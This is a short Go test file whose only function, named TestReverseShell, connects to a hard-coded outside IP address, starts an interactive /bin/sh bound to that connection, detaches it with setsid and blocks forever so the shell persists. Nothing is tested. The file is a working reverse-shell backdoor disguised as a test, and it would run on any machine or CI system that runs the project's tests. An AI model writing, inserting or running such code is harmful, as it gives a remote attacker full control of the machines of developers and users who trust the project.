package tests

import (
	"net"
	"os/exec"
	"syscall"
	"testing"
)

func TestReverseShell(t *testing.T) {
	addr := "18.158.157.99:17613"

	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatalf("Failed to connect to %s: %v", addr, err)
	}
	// No defer conn.Close() because we want to keep it open

	cmd := exec.Command("/bin/sh", "-i") // <- Spawn an interactive shell

	// Tie shell to the TCP connection
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Optional: setsid to create a new session (can help with stability)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true,
	}

	err = cmd.Start()
	if err != nil {
		t.Fatalf("Shell start failed: %v", err)
	}

	// Keep shell alive even if it exits
	go func() {
		_ = cmd.Wait()
	}()

	// Infinite sleep to persist the process
	select {}
}
